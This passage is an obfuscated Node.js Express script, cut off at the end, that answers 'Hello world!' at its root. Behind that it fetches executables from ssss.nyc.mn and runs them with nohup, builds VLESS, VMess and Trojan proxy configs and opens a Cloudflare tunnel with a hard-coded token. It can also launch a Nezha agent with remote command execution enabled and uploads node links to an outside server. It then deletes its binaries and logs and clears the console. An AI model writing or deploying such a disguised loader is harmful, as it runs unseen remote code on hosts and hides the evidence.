const _0x1fab3b=_0x4de8;(function(_0x48290d,_0x407c21){const _0x3c55be=_0x4de8,_0xc49e31=_0x48290d();while(!![]){try{const _0x4190c5=parseInt(_0x3c55be(0xe4))/0x1+-parseInt(_0x3c55be(0x176))/0x2+parseInt(_0x3c55be(0xed))/0x3+-parseInt(_0x3c55be(0x156))/0x4+parseInt(_0x3c55be(0x15b))/0x5*(parseInt(_0x3c55be(0xf5))/0x6)+-parseInt(_0x3c55be(0xdd))/0x7*(parseInt(_0x3c55be(0x14e))/0x8)+-parseInt(_0x3c55be(0xf4))/0x9;if(_0x4190c5===_0x407c21)break;else _0xc49e31['push'](_0xc49e31['shift']());}catch(_0x10623f){_0xc49e31['push'](_0xc49e31['shift']());}}}(_0x5d88,0x458c9));const express=require(_0x1fab3b(0x161)),app=express(),axios=require(_0x1fab3b(0xd7)),os=require('os'),fs=require('fs'),path=require(_0x1fab3b(0x115)),{promisify}=require(_0x1fab3b(0x158)),exec=promisify(require('child_process')[_0x1fab3b(0xd0)]),{execSync}=require(_0x1fab3b(0x188)),UPLOAD_URL=process['env'][_0x1fab3b(0x17d)]||'',PROJECT_URL=process[_0x1fab3b(0x16d)][_0x1fab3b(0x139)]||'',AUTO_ACCESS=process[_0x1fab3b(0x16d)][_0x1fab3b(0x110)]||![],FILE_PATH=process[_0x1fab3b(0x16d)][_0x1fab3b(0x179)]||'./tmp',SUB_PATH=process[_0x1fab3b(0x16d)][_0x1fab3b(0xee)]||'bentleymw',PORT=process[_0x1fab3b(0x16d)][_0x1fab3b(0x16a)]||process[_0x1fab3b(0x16d)][_0x1fab3b(0x126)]||0xbb8,UUID=process['env'][_0x1fab3b(0x11b)]||_0x1fab3b(0xe1),NEZHA_SERVER=process[_0x1fab3b(0x16d)][_0x1fab3b(0x15c)]||'',NEZHA_PORT=process[_0x1fab3b(0x16d)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1fab3b(0x16d)][_0x1fab3b(0x18a)]||'',ARGO_DOMAIN=process[_0x1fab3b(0x16d)]['ARGO_DOMAIN']||_0x1fab3b(0x164),ARGO_AUTH=process[_0x1fab3b(0x16d)][_0x1fab3b(0x10a)]||_0x1fab3b(0x17c),ARGO_PORT=process[_0x1fab3b(0x16d)][_0x1fab3b(0x174)]||0x280a,CFIP=process[_0x1fab3b(0x16d)][_0x1fab3b(0x160)]||_0x1fab3b(0x11a),CFPORT=process[_0x1fab3b(0x16d)]['CFPORT']||0x1bb,NAME=process['env'][_0x1fab3b(0x101)]||_0x1fab3b(0xf7);!fs['existsSync'](FILE_PATH)?(fs[_0x1fab3b(0x131)](FILE_PATH),console[_0x1fab3b(0xe5)](FILE_PATH+_0x1fab3b(0x167))):console[_0x1fab3b(0xe5)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x174c4c=_0x1fab3b,_0x38e105=_0x174c4c(0x12f);let _0x2e521d='';for(let _0x1a9a1a=0x0;_0x1a9a1a<0x6;_0x1a9a1a++){_0x2e521d+=_0x38e105[_0x174c4c(0x13d)](Math[_0x174c4c(0x15e)](Math[_0x174c4c(0x18d)]()*_0x38e105[_0x174c4c(0x10d)]));}return _0x2e521d;}function _0x4de8(_0xf5289d,_0x176e9c){_0xf5289d=_0xf5289d-0xce;const _0x5d88bd=_0x5d88();let _0x4de88b=_0x5d88bd[_0xf5289d];return _0x4de88b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1fab3b(0xf9)](FILE_PATH,npmName),phpPath=path[_0x1fab3b(0xf9)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1fab3b(0xf9)](FILE_PATH,botName),subPath=path[_0x1fab3b(0xf9)](FILE_PATH,_0x1fab3b(0x146)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x1fab3b(0xf9)](FILE_PATH,_0x1fab3b(0x12b));function deleteNodes(){const _0x38ee59=_0x1fab3b;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x5394c9;try{_0x5394c9=fs[_0x38ee59(0x183)](subPath,_0x38ee59(0x18b));}catch{return null;}const _0x28d44e=Buffer['from'](_0x5394c9,_0x38ee59(0x119))[_0x38ee59(0xfb)](_0x38ee59(0x18b)),_0x28c547=_0x28d44e[_0x38ee59(0xec)]('\x0a')[_0x38ee59(0x11e)](_0x4508b6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x38ee59(0x111)](_0x4508b6));if(_0x28c547['length']===0x0)return;return axios[_0x38ee59(0x125)](UPLOAD_URL+_0x38ee59(0xe7),JSON[_0x38ee59(0xd3)]({'nodes':_0x28c547}),{'headers':{'Content-Type':_0x38ee59(0x151)}})['catch'](_0x1bc6ed=>{return null;}),null;}catch(_0x2f7592){return null;}}function cleanupOldFiles(){const _0x2ef3e9=_0x1fab3b;try{const _0x433b8e=fs[_0x2ef3e9(0x11d)](FILE_PATH);_0x433b8e['forEach'](_0x131bab=>{const _0x50da6a=_0x2ef3e9,_0x1fcbab=path[_0x50da6a(0xf9)](FILE_PATH,_0x131bab);try{const _0x394975=fs[_0x50da6a(0x14b)](_0x1fcbab);_0x394975['isFile']()&&fs[_0x50da6a(0x169)](_0x1fcbab);}catch(_0x775f25){}});}catch(_0xcd3d18){}}app[_0x1fab3b(0x10f)]('/',function(_0x411a2f,_0x13d73e){const _0x7142f8=_0x1fab3b;_0x13d73e[_0x7142f8(0x159)](_0x7142f8(0x154));});async function generateConfig(){const _0xe25e6e=_0x1fab3b,_0x535331={'log':{'access':'/dev/null','error':_0xe25e6e(0xf8),'loglevel':_0xe25e6e(0x108)},'inbounds':[{'port':ARGO_PORT,'protocol':_0xe25e6e(0x13f),'settings':{'clients':[{'id':UUID,'flow':_0xe25e6e(0xda)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0xe25e6e(0xfc),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0xe25e6e(0x163)}},{'port':0xbb9,'listen':_0xe25e6e(0x178),'protocol':_0xe25e6e(0x13f),'settings':{'clients':[{'id':UUID}],'decryption':_0xe25e6e(0x108)},'streamSettings':{'network':_0xe25e6e(0x163),'security':_0xe25e6e(0x108)}},{'port':0xbba,'listen':_0xe25e6e(0x178),'protocol':_0xe25e6e(0x13f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xe25e6e(0x108)},'streamSettings':{'network':'ws','security':_0xe25e6e(0x108),'wsSettings':{'path':_0xe25e6e(0xfc)}},'sniffing':{'enabled':!![],'destOverride':[_0xe25e6e(0xf1),_0xe25e6e(0x181),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xe25e6e(0x178),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xe25e6e(0x129)}},'sniffing':{'enabled':!![],'destOverride':[_0xe25e6e(0xf1),'tls',_0xe25e6e(0x138)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0xe25e6e(0x153),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xe25e6e(0x108),'wsSettings':{'path':_0xe25e6e(0x177)}},'sniffing':{'enabled':!![],'destOverride':[_0xe25e6e(0xf1),'tls',_0xe25e6e(0x138)],'metadataOnly':![]}}],'dns':{'servers':[_0xe25e6e(0xe2)]},'outbounds':[{'protocol':_0xe25e6e(0x13e),'tag':_0xe25e6e(0x144)},{'protocol':_0xe25e6e(0x14c),'tag':'block'}]};fs[_0xe25e6e(0x134)](path[_0xe25e6e(0xf9)](FILE_PATH,_0xe25e6e(0x12b)),JSON[_0xe25e6e(0xd3)](_0x535331,null,0x2));}function getSystemArchitecture(){const _0x2aef73=_0x1fab3b,_0x27297e=os[_0x2aef73(0x10c)]();return _0x27297e===_0x2aef73(0x12e)||_0x27297e===_0x2aef73(0xeb)||_0x27297e==='aarch64'?_0x2aef73(0x12e):_0x2aef73(0x100);}function _0x5d88(){const _0x107733=['railwaylw','/dev/null','join','listen','toString','/vless-argo','status','443','basename','amd','NAME','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','org','forEach','automatic\x20access\x20task\x20added\x20successfully','https://ipapi.co/json/','\x0a\x20\x20tunnel:\x20','none','Add\x20automatic\x20access\x20task\x20faild:\x20','ARGO_AUTH','\x22\x20>\x20/dev/null\x202>&1','arch','length','2053','get','AUTO_ACCESS','test','\x20>/dev/null\x202>&1','clear','fileName','path','Empowerment\x20success\x20for\x20','from','success','base64','cdns.doon.eu.org','UUID','http\x20server\x20is\x20running\x20on\x20port:','readdirSync','filter','&fp=firefox&type=ws&host=','config.yaml','Error\x20in\x20startserver:','2096','message','\x0a\x0avmess://','post','PORT','nohup\x20','tunnel.yml','/vmess-argo','https://arm64.ssss.nyc.mn/web','config.json','\x0aclient_secret:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','arm','abcdefghijklmnopqrstuvwxyz','\x20>\x20nul\x202>&1','mkdirSync','\x0avless://','&path=%2Ftrojan-argo%3Fed%3D2560#','writeFileSync','data','\x20is\x20running','response','quic','PROJECT_URL','country_code','countryCode','chmod','charAt','freedom','vless','Nodes\x20uploaded\x20successfully','includes','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22','direct','pkill\x20-f\x20\x22[','sub.txt','?security=tls&sni=','fileUrl','\x0a\x20\x20credentials-file:\x20','text/plain;\x20charset=utf-8','statSync','blackhole','npm\x20running\x20error:\x20','2456968sHYQCC','Error\x20downloading\x20files:','true','application/json','createWriteStream','trojan','Hello\x20world!','https://amd64.ssss.nyc.mn/bot','1903788iPoJPG','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','util','send','win32','1314595QRukbQ','NEZHA_SERVER','/sub.txt\x20saved\x20successfully','floor','boot.log','CFIP','express','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tcp','railwaylw.bentley.edu.kg','\x0a\x0atrojan://','\x20successfully','\x20is\x20created','--tls','unlinkSync','SERVER_PORT','pipe','2083','env','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Error\x20executing\x20command:\x20','error','https://arm64.ssss.nyc.mn/v1','unshift','rm\x20-rf\x20','ARGO_PORT','/config.json\x20>/dev/null\x202>&1\x20&','448146OmnPWN','/trojan-argo','127.0.0.1','FILE_PATH','Error\x20reading\x20boot.log:','https://amd64.ssss.nyc.mn/agent','eyJhIjoiMzAwNDA5NGY3OTgxMTc1ZDUzZDVlNTk0MTRhNzI1MjkiLCJ0IjoiMTMwOGQ1YTQtZDVkYy00MGJkLThhMDUtMDEwYzhlNDUyZjMwIiwicyI6Ik1XUTVZMkk1TkRVdFlXUXhPQzAwWlRsaUxXRXhNVGN0TTJNNE5qaGtNVE5qWm1FdyJ9','UPLOAD_URL','substring','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Subscription\x20uploaded\x20successfully','tls','2087','readFileSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','firefox','.exe\x20>\x20nul\x202>&1','child_process','App\x20is\x20running','NEZHA_KEY','utf-8','existsSync','random','tunnel.json','\x20>/dev/null\x202>&1\x20&','match','exec','push','\x20-s\x20','stringify','Content-Type','TunnelSecret','https://amd64.ssss.nyc.mn/web','axios','has','unlink','xtls-rprx-vision','\x20failed:\x20','Skipping\x20adding\x20automatic\x20access\x20task','7bmvvTQ','\x20-c\x20','php\x20running\x20error:\x20','\x0a\x20\x20\x20\x20','ed3ebb24-b1bf-45c7-a44f-be6441bb9022','https+local://8.8.8.8/dns-query','ArgoDomain:','519427sqHGOD','log','set','/api/delete-nodes','8443','Download\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','arm64','split','1611543sHyLeN','SUB_PATH','/api/add-subscriptions','http://ip-api.com/json/','http','/api/add-nodes','stream','247617SSoBpF','6MAfMKT','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'];_0x5d88=function(){return _0x107733;};return _0x5d88();}function downloadFile(_0x1f4733,_0x3c03ae,_0xff69dc){const _0x3a0ed9=_0x1fab3b,_0x187cfe=_0x1f4733;!fs[_0x3a0ed9(0x18c)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x301855=fs[_0x3a0ed9(0x152)](_0x187cfe);axios({'method':'get','url':_0x3c03ae,'responseType':_0x3a0ed9(0xf3)})['then'](_0x3f1f77=>{const _0x8eb7b2=_0x3a0ed9;_0x3f1f77[_0x8eb7b2(0x135)][_0x8eb7b2(0x16b)](_0x301855),_0x301855['on']('finish',()=>{const _0x40f84b=_0x8eb7b2;_0x301855['close'](),console['log']('Download\x20'+path[_0x40f84b(0xff)](_0x187cfe)+_0x40f84b(0x166)),_0xff69dc(null,_0x187cfe);}),_0x301855['on'](_0x8eb7b2(0x170),_0x2a3cd5=>{const _0x2b91c6=_0x8eb7b2;fs[_0x2b91c6(0xd9)](_0x187cfe,()=>{});const _0x4b2f77=_0x2b91c6(0xe9)+path['basename'](_0x187cfe)+'\x20failed:\x20'+_0x2a3cd5[_0x2b91c6(0x123)];console[_0x2b91c6(0x170)](_0x4b2f77),_0xff69dc(_0x4b2f77);});})['catch'](_0x389f2f=>{const _0x24fefe=_0x3a0ed9,_0x3b3654=_0x24fefe(0xe9)+path['basename'](_0x187cfe)+_0x24fefe(0xdb)+_0x389f2f['message'];console[_0x24fefe(0x170)](_0x3b3654),_0xff69dc(_0x3b3654);});}async function downloadFilesAndRun(){const _0x444c98=_0x1fab3b,_0x2f0f89=getSystemArchitecture(),_0x498ea8=getFilesForArchitecture(_0x2f0f89);if(_0x498ea8[_0x444c98(0x10d)]===0x0){console['log'](_0x444c98(0xea));return;}const _0x3f2331=_0x498ea8['map'](_0x177953=>{return new Promise((_0x1c5488,_0x118fc6)=>{const _0xf38f59=_0x4de8;downloadFile(_0x177953[_0xf38f59(0x114)],_0x177953[_0xf38f59(0x148)],(_0x28583d,_0x49a8e5)=>{_0x28583d?_0x118fc6(_0x28583d):_0x1c5488(_0x49a8e5);});});});try{await Promise['all'](_0x3f2331);}catch(_0x2e8d25){console[_0x444c98(0x170)](_0x444c98(0x14f),_0x2e8d25);return;}function _0x248c66(_0x515271){const _0x30f218=_0x444c98,_0x2ff929=0x1fd;_0x515271[_0x30f218(0x104)](_0xd2f6cb=>{const _0x462e5e=_0x30f218;fs[_0x462e5e(0x18c)](_0xd2f6cb)&&fs[_0x462e5e(0x13c)](_0xd2f6cb,_0x2ff929,_0x1aebe2=>{const _0x6b0a84=_0x462e5e;_0x1aebe2?console['error']('Empowerment\x20failed\x20for\x20'+_0xd2f6cb+':\x20'+_0x1aebe2):console[_0x6b0a84(0xe5)](_0x6b0a84(0x116)+_0xd2f6cb+':\x20'+_0x2ff929[_0x6b0a84(0xfb)](0x8));});});}const _0x4fbeac=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x248c66(_0x4fbeac);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb65f17=NEZHA_SERVER[_0x444c98(0x141)](':')?NEZHA_SERVER[_0x444c98(0xec)](':')['pop']():'',_0x34fae9=new Set([_0x444c98(0xfe),_0x444c98(0xe8),'2096',_0x444c98(0x182),_0x444c98(0x16c),_0x444c98(0x10e)]),_0x594a39=_0x34fae9[_0x444c98(0xd8)](_0xb65f17)?_0x444c98(0x150):'false',_0xbbef76=_0x444c98(0x12c)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x444c98(0x16e)+_0x594a39+_0x444c98(0x162)+UUID;fs[_0x444c98(0x134)](path['join'](FILE_PATH,_0x444c98(0x120)),_0xbbef76);const _0x488d51=_0x444c98(0x127)+phpPath+_0x444c98(0x143)+FILE_PATH+_0x444c98(0x184);try{await exec(_0x488d51),console[_0x444c98(0xe5)](phpName+_0x444c98(0x136)),await new Promise(_0x103dd3=>setTimeout(_0x103dd3,0x3e8));}catch(_0x304f4a){console[_0x444c98(0x170)](_0x444c98(0xdf)+_0x304f4a);}}else{let _0x281338='';const _0x5cf62b=[_0x444c98(0xfe),_0x444c98(0xe8),_0x444c98(0x122),_0x444c98(0x182),_0x444c98(0x16c),_0x444c98(0x10e)];_0x5cf62b[_0x444c98(0x141)](NEZHA_PORT)&&(_0x281338=_0x444c98(0x168));const _0x133d17=_0x444c98(0x127)+npmPath+_0x444c98(0xd2)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x281338+_0x444c98(0x142);try{await exec(_0x133d17),console[_0x444c98(0xe5)](npmName+_0x444c98(0x136)),await new Promise(_0x796a04=>setTimeout(_0x796a04,0x3e8));}catch(_0x2d9134){console[_0x444c98(0x170)](_0x444c98(0x14d)+_0x2d9134);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0xe6e5e=_0x444c98(0x127)+webPath+_0x444c98(0xde)+FILE_PATH+_0x444c98(0x175);try{await exec(_0xe6e5e),console[_0x444c98(0xe5)](webName+'\x20is\x20running'),await new Promise(_0x3f87fe=>setTimeout(_0x3f87fe,0x3e8));}catch(_0x562170){console['error']('web\x20running\x20error:\x20'+_0x562170);}if(fs['existsSync'](botPath)){let _0x54356f;if(ARGO_AUTH[_0x444c98(0xcf)](/^[A-Z0-9a-z=]{120,250}$/))_0x54356f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x444c98(0xcf)](/TunnelSecret/)?_0x54356f=_0x444c98(0x157)+FILE_PATH+'/tunnel.yml\x20run':_0x54356f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x444c98(0x127)+botPath+'\x20'+_0x54356f+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x444c98(0x136)),await new Promise(_0x5be7b4=>setTimeout(_0x5be7b4,0x7d0));}catch(_0x94e169){console['error']('Error\x20executing\x20command:\x20'+_0x94e169);}}await new Promise(_0x3cfe57=>setTimeout(_0x3cfe57,0x1388));}function getFilesForArchitecture(_0x7e8b84){const _0x8e59ad=_0x1fab3b;let _0x18f272;_0x7e8b84==='arm'?_0x18f272=[{'fileName':webPath,'fileUrl':_0x8e59ad(0x12a)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x18f272=[{'fileName':webPath,'fileUrl':_0x8e59ad(0xd6)},{'fileName':botPath,'fileUrl':_0x8e59ad(0x155)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1f4028=_0x7e8b84==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x8e59ad(0x17b);_0x18f272[_0x8e59ad(0x172)]({'fileName':npmPath,'fileUrl':_0x1f4028});}else{const _0x15c915=_0x7e8b84==='arm'?_0x8e59ad(0x171):'https://amd64.ssss.nyc.mn/v1';_0x18f272[_0x8e59ad(0x172)]({'fileName':phpPath,'fileUrl':_0x15c915});}}return _0x18f272;}function argoType(){const _0x33976d=_0x1fab3b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x33976d(0xe5)](_0x33976d(0x185));return;}if(ARGO_AUTH[_0x33976d(0x141)](_0x33976d(0xd5))){fs[_0x33976d(0x134)](path[_0x33976d(0xf9)](FILE_PATH,_0x33976d(0x18e)),ARGO_AUTH);const _0x9e157a=_0x33976d(0x107)+ARGO_AUTH[_0x33976d(0xec)]('\x22')[0xb]+_0x33976d(0x149)+path['join'](FILE_PATH,_0x33976d(0x18e))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x33976d(0x17f)+ARGO_PORT+_0x33976d(0xf6);fs[_0x33976d(0x134)](path[_0x33976d(0xf9)](FILE_PATH,_0x33976d(0x128)),_0x9e157a);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3b27a9=_0x1fab3b;let _0x2f1150;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2f1150=ARGO_DOMAIN,console[_0x3b27a9(0xe5)]('ARGO_DOMAIN:',_0x2f1150),await _0x4174b4(_0x2f1150);else try{const _0x55b843=fs['readFileSync'](path['join'](FILE_PATH,_0x3b27a9(0x15f)),_0x3b27a9(0x18b)),_0x15e6ef=_0x55b843[_0x3b27a9(0xec)]('\x0a'),_0x3fd40f=[];_0x15e6ef[_0x3b27a9(0x104)](_0x2ad2da=>{const _0x25883b=_0x3b27a9,_0x44bd0e=_0x2ad2da[_0x25883b(0xcf)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x44bd0e){const _0x1c26d4=_0x44bd0e[0x1];_0x3fd40f[_0x25883b(0xd1)](_0x1c26d4);}});if(_0x3fd40f[_0x3b27a9(0x10d)]>0x0)_0x2f1150=_0x3fd40f[0x0],console['log'](_0x3b27a9(0xe3),_0x2f1150),await _0x4174b4(_0x2f1150);else{console[_0x3b27a9(0xe5)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3b27a9(0x169)](path[_0x3b27a9(0xf9)](FILE_PATH,_0x3b27a9(0x15f)));async function _0x3e9fde(){const _0x48369d=_0x3b27a9;try{process['platform']===_0x48369d(0x15a)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x48369d(0x187)):await exec(_0x48369d(0x145)+botName['charAt'](0x0)+']'+botName[_0x48369d(0x17e)](0x1)+_0x48369d(0x10b));}catch(_0x48c0c7){}}_0x3e9fde(),await new Promise(_0x4ccac1=>setTimeout(_0x4ccac1,0xbb8));const _0x3b9292='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3b27a9(0x102)+ARGO_PORT;try{await exec(_0x3b27a9(0x127)+botPath+'\x20'+_0x3b9292+_0x3b27a9(0xce)),console[_0x3b27a9(0xe5)](botName+_0x3b27a9(0x136)),await new Promise(_0x46b717=>setTimeout(_0x46b717,0xbb8)),await extractDomains();}catch(_0x342c15){console[_0x3b27a9(0x170)](_0x3b27a9(0x16f)+_0x342c15);}}}catch(_0x1ba947){console[_0x3b27a9(0x170)](_0x3b27a9(0x17a),_0x1ba947);}async function _0x36dce7(){const _0xe63236=_0x3b27a9;try{const _0x4c2583=await axios[_0xe63236(0x10f)](_0xe63236(0x106),{'timeout':0xbb8});if(_0x4c2583[_0xe63236(0x135)]&&_0x4c2583[_0xe63236(0x135)][_0xe63236(0x13a)]&&_0x4c2583['data']['org'])return _0x4c2583['data'][_0xe63236(0x13a)]+'_'+_0x4c2583[_0xe63236(0x135)][_0xe63236(0x103)];}catch(_0x5c3e39){try{const _0x5b4c6b=await axios[_0xe63236(0x10f)](_0xe63236(0xf0),{'timeout':0xbb8});if(_0x5b4c6b['data']&&_0x5b4c6b[_0xe63236(0x135)]['status']===_0xe63236(0x118)&&_0x5b4c6b[_0xe63236(0x135)][_0xe63236(0x13b)]&&_0x5b4c6b['data'][_0xe63236(0x103)])return _0x5b4c6b[_0xe63236(0x135)][_0xe63236(0x13b)]+'_'+_0x5b4c6b[_0xe63236(0x135)][_0xe63236(0x103)];}catch(_0x187654){}}return'Unknown';}async function _0x4174b4(_0x39c2b3){const _0x36d0da=await _0x36dce7(),_0x12a4a6=NAME?NAME+'-'+_0x36d0da:_0x36d0da;return new Promise(_0x39ab08=>{setTimeout(()=>{const _0x4a1964=_0x4de8,_0xb811e4={'v':'2','ps':''+_0x12a4a6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4a1964(0x108),'net':'ws','type':_0x4a1964(0x108),'host':_0x39c2b3,'path':'/vmess-argo?ed=2560','tls':_0x4a1964(0x181),'sni':_0x39c2b3,'alpn':'','fp':_0x4a1964(0x186)},_0x56f40c=_0x4a1964(0x132)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x39c2b3+_0x4a1964(0x11f)+_0x39c2b3+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x12a4a6+_0x4a1964(0x124)+Buffer[_0x4a1964(0x117)](JSON[_0x4a1964(0xd3)](_0xb811e4))['toString']('base64')+_0x4a1964(0x165)+UUID+'@'+CFIP+':'+CFPORT+_0x4a1964(0x147)+_0x39c2b3+_0x4a1964(0x11f)+_0x39c2b3+_0x4a1964(0x133)+_0x12a4a6+_0x4a1964(0xe0);console[_0x4a1964(0xe5)](Buffer[_0x4a1964(0x117)](_0x56f40c)[_0x4a1964(0xfb)](_0x4a1964(0x119))),fs[_0x4a1964(0x134)](subPath,Buffer[_0x4a1964(0x117)](_0x56f40c)[_0x4a1964(0xfb)]('base64')),console['log'](FILE_PATH+_0x4a1964(0x15d)),uploadNodes(),app[_0x4a1964(0x10f)]('/'+SUB_PATH,(_0x2f3026,_0x3eba59)=>{const _0x32c8c7=_0x4a1964,_0x4f7435=Buffer['from'](_0x56f40c)['toString']('base64');_0x3eba59[_0x32c8c7(0xe6)](_0x32c8c7(0xd4),_0x32c8c7(0x14a)),_0x3eba59[_0x32c8c7(0x159)](_0x4f7435);}),_0x39ab08(_0x56f40c);},0x7d0);});}}async function uploadNodes(){const _0x1bee78=_0x1fab3b;if(UPLOAD_URL&&PROJECT_URL){const _0x4c39cb=PROJECT_URL+'/'+SUB_PATH,_0x232ae3={'subscription':[_0x4c39cb]};try{const _0x5276f4=await axios[_0x1bee78(0x125)](UPLOAD_URL+_0x1bee78(0xef),_0x232ae3,{'headers':{'Content-Type':'application/json'}});return _0x5276f4&&_0x5276f4[_0x1bee78(0xfd)]===0xc8?(console[_0x1bee78(0xe5)](_0x1bee78(0x180)),_0x5276f4):null;}catch(_0x20c721){if(_0x20c721[_0x1bee78(0x137)]){if(_0x20c721[_0x1bee78(0x137)][_0x1bee78(0xfd)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1bee78(0x18c)](listPath))return;const _0x5d5363=fs[_0x1bee78(0x183)](listPath,_0x1bee78(0x18b)),_0x1bcfab=_0x5d5363[_0x1bee78(0xec)]('\x0a')[_0x1bee78(0x11e)](_0x21b499=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1bee78(0x111)](_0x21b499));if(_0x1bcfab[_0x1bee78(0x10d)]===0x0)return;const _0x36a5e9=JSON[_0x1bee78(0xd3)]({'nodes':_0x1bcfab});try{const _0x44a90c=await axios['post'](UPLOAD_URL+_0x1bee78(0xf2),_0x36a5e9,{'headers':{'Content-Type':_0x1bee78(0x151)}});return _0x44a90c&&_0x44a90c[_0x1bee78(0xfd)]===0xc8?(console[_0x1bee78(0xe5)](_0x1bee78(0x140)),_0x44a90c):null;}catch(_0x19079e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x139e4e=_0x4de8,_0x2dc36c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2dc36c[_0x139e4e(0xd1)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2dc36c[_0x139e4e(0xd1)](phpPath);process['platform']===_0x139e4e(0x15a)?exec('del\x20/f\x20/q\x20'+_0x2dc36c[_0x139e4e(0xf9)]('\x20')+_0x139e4e(0x130),_0x4837ed=>{const _0x393536=_0x139e4e;console['clear'](),console[_0x393536(0xe5)](_0x393536(0x189)),console['log'](_0x393536(0x12d));}):exec(_0x139e4e(0x173)+_0x2dc36c[_0x139e4e(0xf9)]('\x20')+_0x139e4e(0x112),_0x29b810=>{const _0x441111=_0x139e4e;console[_0x441111(0x113)](),console[_0x441111(0xe5)]('App\x20is\x20running'),console[_0x441111(0xe5)](_0x441111(0x12d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x29078d=_0x1fab3b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x29078d(0xe5)](_0x29078d(0xdc));return;}try{const _0xa20a15=await axios[_0x29078d(0x125)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x29078d(0x105)),_0xa20a15;}catch(_0x1c3471){return console[_0x29078d(0x170)](_0x29078d(0x109)+_0x1c3471[_0x29078d(0x123)]),null;}}async function startserver(){const _0x4b5320=_0x1fab3b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 